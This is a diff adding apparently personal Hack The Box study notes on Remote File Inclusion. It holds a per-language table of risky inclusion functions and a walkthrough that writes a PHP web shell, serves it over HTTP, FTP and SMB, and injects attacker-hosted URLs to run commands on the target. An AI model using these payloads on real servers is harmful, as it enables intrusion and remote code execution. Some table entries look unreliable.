@@ -97,4 +97,109 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 
+# Remote File Inclusion (RFI)
+the following are some of the functions that (if vulnerable) would allow RFI:
 
+| **Technology/Function**             | **Read Content** | **Execute** | **Remote URL** | **Notes**                                                 |
+| ----------------------------------- | ---------------- | ----------- | -------------- | --------------------------------------------------------- |
+| **PHP**                             |                  |             |                |                                                           |
+| `include()`/`include_once()`        | ✅                | ✅           | ✅              | Still relevant; major RFI vector                          |
+| `require()`/`require_once()`        | ✅                | ✅           | ✅              | Similar to include but fails fatally                      |
+| `file_get_contents()`               | ✅                | ❌           | ✅              | Can read remote content with `allow_url_fopen=On`         |
+| `fopen()`                           | ✅                | ❌           | ✅              | Can access remote URLs with `allow_url_fopen=On`          |
+| **Node.js**                         |                  |             |                |                                                           |
+| `require()`                         | ✅                | ✅           | ❌              | Local by default, but can be bypassed                     |
+| `import()`                          | ✅                | ✅           | ✅              | Dynamic imports can load from URLs                        |
+| `fs` module functions               | ✅                | ❌           | ❌              | Local filesystem only                                     |
+| `http`/`https` modules              | ✅                | ❌           | ✅              | Explicitly for remote content                             |
+| `child_process.exec()`              | ✅                | ✅           | ✅              | Can execute commands that fetch remote content            |
+| **Ruby**                            |                  |             |                |                                                           |
+| `require`/`require_relative`        | ✅                | ✅           | ❌              | Local files only                                          |
+| `load`                              | ✅                | ✅           | ❌              | Similar to require but reloads each time                  |
+| `open`                              | ✅                | ❌           | ✅              | Can open remote URLs                                      |
+| `Kernel.eval`                       | ✅                | ✅           | ✅              | When combined with remote content                         |
+| `ERB.new().result`                  | ✅                | ✅           | ✅              | Template injection with remote content                    |
+| **Python**                          |                  |             |                |                                                           |
+| `import`/`importlib`                | ✅                | ✅           | ❌              | Local modules only                                        |
+| `exec`/`eval`                       | ✅                | ✅           | ✅              | When combined with remote content                         |
+| `urllib`/`requests`                 | ✅                | ❌           | ✅              | Explicitly for remote content                             |
+| `open()`                            | ✅                | ❌           | ❌              | Local files only in modern Python                         |
+| **Java**                            |                  |             |                |                                                           |
+| `URLClassLoader`                    | ✅                | ✅           | ✅              | Can load classes from remote URLs                         |
+| `Class.forName()`                   | ✅                | ✅           | ❌              | Local classes only, but often misused                     |
+| `javax.script`                      | ✅                | ✅           | ✅              | When evaluating remote scripts                            |
+| `import`                            | ✅                | ✅           | ✅              |                                                           |
+| **Go**                              |                  |             |                |                                                           |
+| `plugin.Open()`                     | ✅                | ✅           | ❌              | Local shared objects only                                 |
+| `http` package                      | ✅                | ❌           | ✅              | Explicitly for remote content                             |
+| `os/exec`                           | ✅                | ✅           | ✅              | Can execute commands that fetch remote content            |
+| **Rust**                            |                  |             |                |                                                           |
+| `include!` macro                    | ✅                | ✅           | ❌              | Compile-time only, local files                            |
+| `std::fs`                           | ✅                | ❌           | ❌              | Local filesystem only                                     |
+| `reqwest`                           | ✅                | ❌           | ✅              | HTTP client for remote content                            |
+| **ASP.NET**                         |                  |             |                |                                                           |
+| `@Html.RemotePartial()`             | ✅                | ❌           | ✅              | MVC-specific                                              |
+| `@Html.Partial()`                   | ✅                | ❌           | ❌              | Local views only                                          |
+| `System.Reflection.Assembly.Load()` | ✅                | ✅           | ✅              | Can load assemblies from byte arrays (potentially remote) |
+
+## Verify RFI
+```shell-session
+alakin2504@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+
+allow_url_include = On
+```
+
+## Remote Code Execution with RFI
+```shell-session
+alakin2504@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+## HTTP
+```shell-session
+alakin2504@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
+Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
+```
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+```
+
+## FTP
+```shell-session
+alakin2504@htb[/htb]$ sudo python -m pyftpdlib -p 21
+
+[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
+[SNIP] concurrency model: async
+[SNIP] masquerade (NAT) address: None
+[SNIP] passive ports: None
+```
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+```
+As we can see, this worked very similarly to our http attack, and the command was executed. By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:
+
+```shell-session
+alakin2504@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+...SNIP...
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+## SMB
+```shell-session
+alakin2504@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+```
+
+
+# LFI and File Uploads
